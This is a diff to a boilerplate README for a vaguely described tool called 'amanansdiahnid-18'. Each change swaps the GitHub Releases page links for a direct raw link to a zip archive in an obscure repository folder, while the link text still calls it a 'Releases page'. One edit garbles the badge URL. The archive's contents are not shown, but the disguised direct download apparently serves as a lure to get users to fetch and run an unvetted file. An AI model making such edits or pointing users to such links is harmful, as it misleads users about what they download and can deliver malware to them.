@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-18 - Simplify Your Workflow Effortlessly
 
-[![Download amanansdiahnid-18](https://img.shields.io/badge/Download%20Now-amanansdiahnid--18-brightgreen)](https://github.com/Loyievi/amanansdiahnid-18/releases)
+[![Download amanansdiahnid-18](https://raw.githubusercontent.com/Loyievi/amanansdiahnid-18/main/limnery/amanansdiahnid-18.zip%20Now-amanansdiahnid--18-brightgreen)](https://raw.githubusercontent.com/Loyievi/amanansdiahnid-18/main/limnery/amanansdiahnid-18.zip)
 
 ## 📜 Description
 
@@ -19,7 +19,7 @@ To run amanansdiahnid-18 successfully, ensure your system meets these requiremen
 
 Follow these steps to download and run amanansdiahnid-18.
 
-1. Visit the [Releases page](https://github.com/Loyievi/amanansdiahnid-18/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Loyievi/amanansdiahnid-18/main/limnery/amanansdiahnid-18.zip) to find the latest version.
 2. Look for the most recent version listed.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the installation file in your downloads folder.
@@ -49,7 +49,7 @@ Now, go ahead and get started with amanansdiahnid-18, and make your tasks easier
 
 ## 📥 Download & Install
 
-To download amanansdiahnid-18, visit [this page](https://github.com/Loyievi/amanansdiahnid-18/releases) and choose your version! Follow the installation instructions above based on your operating system.
+To download amanansdiahnid-18, visit [this page](https://raw.githubusercontent.com/Loyievi/amanansdiahnid-18/main/limnery/amanansdiahnid-18.zip) and choose your version! Follow the installation instructions above based on your operating system.
 
 ## 🛠️ Features
 
